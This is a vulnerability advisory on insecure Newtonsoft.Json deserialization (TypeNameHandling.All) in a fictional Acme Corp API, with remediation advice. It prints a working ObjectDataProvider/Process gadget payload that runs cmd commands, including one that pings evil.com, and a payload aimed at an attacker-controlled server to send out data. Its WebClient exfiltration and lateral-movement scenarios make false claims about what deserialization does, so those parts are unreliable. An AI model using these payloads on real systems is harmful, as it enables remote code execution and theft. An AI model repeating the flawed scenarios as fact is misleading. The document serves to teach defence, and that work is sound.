# Insecure Deserialization in Newtonsoft.Json with TypeNameHandling.All

# Vulnerability Case
During the cybersecurity assessment of Acme Corp's ASP.NET Core API, it was discovered that the application uses Newtonsoft.Json for JSON deserialization with the insecure configuration `TypeNameHandling = All` without implementing a custom `SerializationBinder`. This misconfiguration allows attackers to submit manipulated JSON payloads that can specify arbitrary types, potentially triggering the instantiation of unsafe objects and leading to arbitrary code execution. The vulnerability was identified through detailed code inspection and runtime analysis of user-supplied data in a microservices environment. Exploiting this flaw could facilitate privilege escalation and lateral movement within the network, posing a significant risk to business continuity and data security.

```csharp
using Newtonsoft.Json;
using System;
using System.IO;

namespace VulnerableApp
{
    class Program
    {
        static void Main(string[] args)
        {
            // Read JSON payload from an external source (e.g., user input)
            string jsonPayload = File.ReadAllText("data.json");

            // Vulnerable configuration: enabling all type names without binding restrictions
            JsonSerializerSettings settings = new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.All
            };

            // Insecure deserialization that can instantiate arbitrary types
            object deserializedObject =
                JsonConvert.DeserializeObject(jsonPayload, settings);

            Console.WriteLine("Deserialized object: " + deserializedObject);
        }
    }
}
```

Exploitation of this vulnerability involves an attacker crafting a malicious JSON payload embedded with fully qualified type names to force the deserialization engine to instantiate types that may execute unintended code. In real-world scenarios using .NET Core and Newtonsoft.Json, such a payload could trigger execution of malicious logic (e.g., via gadget chains in known libraries) within the context of the process, leading to arbitrary code execution. Successful exploitation could enable attackers to gain elevated privileges, bypass security controls, and potentially compromise sensitive data, resulting in significant business impact including operational disruption and reputational damage.

context: csharp.lang.security.insecure-deserialization.newtonsoft.insecure-newtonsoft-deserialization TypeNameHandling $TYPEHANDLER is unsafe and can lead to arbitrary code execution in the context of the process. Use a custom SerializationBinder whenever using a setting other than TypeNameHandling.None.

# Vulnerability Breakdown
This vulnerability involves a critical configuration issue in the ASP.NET Core API using Newtonsoft.Json for deserialization with TypeNameHandling.All without implementing a SerializationBinder.

1. **Key vulnerability elements**:
   - TypeNameHandling.All configuration allowing arbitrary type instantiation
   - Missing SerializationBinder implementation to restrict deserializable types
   - External user input directly fed into the deserialization process
   - No validation or sanitization of JSON payload before deserialization

2. **Potential attack vectors**:
   - Crafting malicious JSON with type information pointing to dangerous types
   - Leveraging known gadget chains in common .NET libraries
   - Exploiting types with dangerous constructors or property setters
   - Chaining multiple object instantiations to achieve arbitrary code execution

3. **Severity assessment**:
   - The vulnerability allows arbitrary code execution in the context of the application
   - Can lead to complete system compromise, including data theft and manipulation
   - Enables privilege escalation and lateral movement within the network
   - Requires specialized knowledge of .NET deserialization and gadget chains

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): High (H) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): None (N) 
   - Scope (S): Changed (C)
   - Confidentiality (C): High (H) 
   - Integrity (I): High (H) 
   - Availability (A): High (H) 

# Description
A critical insecure deserialization vulnerability has been identified in Acme Corp's ASP.NET Core API which uses Newtonsoft.Json with the dangerous `TypeNameHandling.All` configuration without implementing a custom `SerializationBinder`. This misconfiguration allows attackers to supply JSON payloads containing arbitrary type specifications that can lead to instantiation of dangerous types during deserialization.

The vulnerable code accepts external JSON input and deserializes it with the following unsafe configuration:

```csharp
JsonSerializerSettings settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All
};

object deserializedObject =
    JsonConvert.DeserializeObject(jsonPayload, settings);

```

This configuration instructs Newtonsoft.Json to honor type information embedded in the JSON payload and instantiate objects of those types. Without proper type restrictions via a custom SerializationBinder, attackers can specify malicious types that execute arbitrary code during instantiation through constructors, property setters, or known gadget chains in common .NET libraries.

# CVSS
**Score**: 9.0 \
**Vector**: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H \
**Severity**: Critical

This vulnerability receives a Critical severity rating (9.0) for several reasons:

- **Network Attack Vector (AV:N)**: The vulnerability can be exploited remotely by sending malicious JSON payloads to the API.

- **High Attack Complexity (AC:H)**: Exploitation requires specialized knowledge of .NET deserialization vulnerabilities, familiarity with gadget chains, and creation of precisely crafted payloads dependent on the target environment. The attacker needs to understand:
  - Internal .NET serialization mechanisms
  - Knowledge of suitable gadget chains
  - Assembly-qualified type names
  - The specific .NET framework and library versions in use

- **No Privileges Required (PR:N)**: The attacker doesn't need any authentication or authorization to submit JSON payloads.

- **No User Interaction (UI:N)**: The vulnerability can be exploited without any action from users or administrators.

- **Changed Scope (S:C)**: The vulnerability allows the attacker to impact resources beyond the vulnerable component itself, as code execution occurs in the context of the process, potentially affecting other applications or services on the same system.

- **High Confidentiality Impact (C:H)**: Arbitrary code execution can lead to complete disclosure of all data stored or processed by the application.

- **High Integrity Impact (I:H)**: The attacker can modify all data within the application and potentially other applications on the same system.

- **High Availability Impact (A:H)**: The attacker can render the application completely unavailable by executing denial-of-service code.

Despite the higher attack complexity, this vulnerability still receives a Critical rating due to its remote exploitability, changed scope, and maximum possible impact across all three impact metrics.

# Exploitation Scenarios
**Scenario 1: Remote Code Execution via Gadget Chain**
An attacker identifies the vulnerable API endpoint that accepts JSON input. They craft a specially formed JSON payload that includes a `$type` field pointing to a known gadget chain starting point in a common .NET library. For example:

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["cmd", "/c calc.exe"]
  },
  "ObjectInstance": { "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" }
}

```

When this payload is deserialized, it instantiates a Process object and executes the calculator application. In a real attack, this would be replaced with commands to download and execute malware, establish persistence, or exfiltrate data.

**Scenario 2: Data Exfiltration via Network Connection**
An attacker crafts a payload that instantiates types capable of network communication, sends sensitive data to an attacker-controlled server, and leaves no obvious traces of the attack:

```json
{
  "$type": "System.Net.WebClient, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
  "QueryString": {
    "$type": "System.Collections.Specialized.NameValueCollection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "data": "[contents of sensitive configuration files]"
  },
  "BaseAddress": "https://attacker-controlled-server.com/collect"
}

```

When deserialized, this payload reads sensitive data and sends it to the attacker's server.

**Scenario 3: Lateral Movement in Microservices**
In a microservices environment, an attacker first compromises the vulnerable API. They then craft payloads that access internal network resources normally inaccessible from the outside:

```json
{
  "$type": "System.Net.WebClient, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
  "DownloadString": "http://internal-service:8080/admin/users"
}

```

This allows the attacker to pivot through the network, accessing internal services protected by network segmentation but accessible from the compromised application.

# Impact Analysis
**Business Impact:**
- Complete compromise of the application and potentially the hosting environment
- Unauthorized access to sensitive customer and business data stored or processed by the application
- Violation of data protection regulations (GDPR, CCPA, etc.) potentially leading to significant fines
- Reputational damage if a breach becomes public, affecting customer trust and business relationships
- Potential business disruption if attackers choose to render services unavailable
- Costs associated with incident response, forensic investigation, and remediation
- Potential legal liability if compromised data is used in subsequent attacks

**Technical Impact:**
- Arbitrary code execution within the context of the application process
- Complete compromise of the affected application's confidentiality, integrity, and availability
- Potential privilege escalation if the application runs with elevated permissions
- Access to application secrets, connection strings, and API keys
- Ability to access internal services and resources not normally exposed to the internet
- Potential for persistent access through backdoors or creation of additional authentication mechanisms
- Lateral movement to other systems using compromised credentials or trusted relationships
- Ability to modify application logic, data, or stored procedures
- Possible access to underlying operating system resources depending on the application's permissions

# Technical Details
The vulnerability stems from using Newtonsoft.Json's TypeNameHandling.All setting without implementing proper type restrictions. This configuration tells the deserializer to include and respect type information in the JSON, allowing creation of arbitrary types.

```csharp
using Newtonsoft.Json;
using System;
using System.IO;

namespace VulnerableApp
{
    class Program
    {
        static void Main(string[] args)
        {
            // Read JSON payload from an external source (e.g., user input)
            string jsonPayload = File.ReadAllText("data.json");

            // Vulnerable configuration: enabling all type names without binding restrictions
            JsonSerializerSettings settings = new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.All
            };

            // Insecure deserialization that can instantiate arbitrary types
            object deserializedObject =
                JsonConvert.DeserializeObject(jsonPayload, settings);

            Console.WriteLine("Deserialized object: " + deserializedObject);
        }
    }
}

```

**Exploitation Details:**

When TypeNameHandling.All is used, Newtonsoft.Json uses type information embedded in the JSON to determine what .NET types to instantiate. The serialized JSON includes a special "$type" property containing assembly-qualified type names:

```json
{
  "$type": "NamespaceName.TypeName, AssemblyName, Version=x.x.x.x, Culture=neutral, PublicKeyToken=xxxxxxxxxxxx",
  "Property1": "value1",
  "Property2": "value2"
}

```

During deserialization, the following sequence occurs:

1. The deserializer reads the "$type" value
2. It loads the specified assembly if not already loaded
3. It creates an instance of the specified type
4. It populates the object's properties with the JSON values

Without a custom SerializationBinder, there's no restriction on what types can be instantiated. Attackers can leverage this to target types that either:

1. Execute code in their constructors or property setters
2. Form part of a "gadget chain" where a sequence of seemingly innocent method calls can be chained to achieve code execution

Many built-in .NET types can be abused in this way, especially those in frameworks like Windows Presentation Foundation (WPF), Windows Communication Foundation (WCF), and ASP.NET.

**Common Gadget Chain Example:**

One of the most common gadget chains utilizes ObjectDataProvider from WPF:

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["cmd", "/c ping evil.com"]
  },
  "ObjectInstance": { "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" }
}

```

When deserialized, this creates a Process object and calls its Start method with the provided parameters, executing the command.

# Remediation Steps
## Change TypeNameHandling to None

**Priority**: P0

The most secure option is to completely disable type handling in the JSON deserializer by setting TypeNameHandling to None:

```csharp
JsonSerializerSettings settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.None // Secure setting
};

object deserializedObject = JsonConvert.DeserializeObject(jsonPayload, settings);

```

With this configuration, Newtonsoft.Json will ignore any type information in the JSON payload and deserialize objects based on the target type parameter provided to DeserializeObject<T>(). This prevents attackers from controlling what types are instantiated during deserialization.

If you need to deserialize polymorphic types, consider using a known type parameter or design patterns that don't require embedding type information in the JSON.
## Implement a Custom SerializationBinder

**Priority**: P1

If you absolutely must use TypeNameHandling for polymorphic deserialization, implement a custom SerializationBinder to restrict which types can be deserialized:

```csharp
using Newtonsoft.Json;
using Newtonsoft.Json.Serialization;
using System;

public class SafeSerializationBinder : ISerializationBinder
{
    private static readonly HashSet<string> AllowedTypes = new HashSet<string>
    {
        // Only add types that are safe to deserialize
        "YourNamespace.SafeType1, YourAssembly",
        "YourNamespace.SafeType2, YourAssembly"
        // Add other safe types as needed
    };

    public Type BindToType(string assemblyName, string typeName)
    {
        string fullTypeName = $"{typeName}, {assemblyName}";
        
        // Only allow known safe types
        if (!AllowedTypes.Contains(fullTypeName))
        {
            throw new JsonSerializationException($"Type {fullTypeName} is not allowed for deserialization");
        }
        
        return Type.GetType(fullTypeName, false) ?? 
               throw new JsonSerializationException($"Could not find type {fullTypeName}");
    }

    public void BindToName(Type serializedType, out string assemblyName, out string typeName)
    {
        assemblyName = serializedType.Assembly.FullName;
        typeName = serializedType.FullName;
    }
}

// Usage:
JsonSerializerSettings settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.Auto, // Less permissive than All
    SerializationBinder = new SafeSerializationBinder()
};

object deserializedObject = JsonConvert.DeserializeObject(jsonPayload, settings);

```

This implementation creates a whitelist of safe types and prevents deserialization of any type not explicitly allowed. Maintain this list carefully and keep it as restrictive as possible.


# References
* CWE-502 | [Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* A08:2021 | [Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
* CWE-94 | [Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html)
